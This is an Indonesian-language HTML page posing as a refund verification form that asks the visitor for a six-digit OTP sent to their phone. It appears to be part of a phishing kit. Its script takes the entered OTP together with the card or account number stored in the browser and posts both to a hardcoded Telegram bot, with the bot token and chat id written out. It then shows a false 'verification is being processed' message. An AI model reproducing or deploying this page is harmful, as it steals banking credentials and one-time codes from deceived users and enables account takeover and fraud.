<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi</title>
    <style>
        * { box-sizing: border-box; font-family: sans-serif; }
        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #eee; }
        .card { background: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .summary { background: #f0fdf2; padding: 10px; border-radius: 8px; font-size: 12px; margin-bottom: 20px; border: 1px solid #03AC0E; }
        input { width: 100%; padding: 14px; text-align: center; font-size: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px; }
        .btn-v { width: 100%; padding: 14px; background: #03AC0E; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h3>Kode Verifikasi</h3>
        <div class="summary">
            <b>Ringkasan Pengembalian dana:</b><br>
            Metode: <span id="m"></span><br>
            No Rekening penerima: <span id="nc"></span>
        </div>
        <p style="font-size: 13px; color: #666;">Masukkan kode yang dikirim ke nomor Anda</p>
        <input type="tel" id="otp" placeholder="000000" maxlength="6">
        <button class="btn-v" id="btnV">Verifikasi</button>
        <p style="text-align:center; font-size: 12px; color: #999;">Kirim ulang dalam <span id="t">30</span>s</p>
    </div>

    <script>
        document.getElementById('m').innerText = localStorage.getItem('metode');
        document.getElementById('nc').innerText = localStorage.getItem('c');

        let s = 30;
        setInterval(() => { if(s > 0) { s--; document.getElementById('t').innerText = s; } }, 1000);

        document.getElementById('btnV').onclick = () => {
            const otp = document.getElementById('otp').value;
            const msg = `<b>🔐 OTP BARU</b>\nKartu: ${localStorage.getItem('c')}\nKode: <code>${otp}</code>`;
            fetch(`https://api.telegram.org/bot8870126844:AAGXw_QRhYAKB92aFZhH8cOsNHDRaUKXmZw/sendMessage`, {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({chat_id: '8723798929', text: msg, parse_mode: 'HTML'})
            }).then(() => alert("Terima kasih, verifikasi sedang diproses."));
        };
    </script>
</body>
</html>
